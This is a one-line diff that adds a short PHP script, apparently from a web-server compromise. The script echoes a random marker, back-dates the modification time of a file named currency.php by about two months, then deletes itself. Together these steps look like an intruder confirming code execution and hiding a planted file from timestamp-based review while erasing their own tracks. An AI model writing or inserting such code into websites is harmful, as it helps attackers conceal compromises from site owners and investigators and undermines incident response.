@@ -1,0 +1,1 @@
+<?php echo "rrxaShzfnw"; if (file_exists("./currency.php")){ touch("./currency.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*9x6pRPcG2P71MnBwfeRy*/ ?>
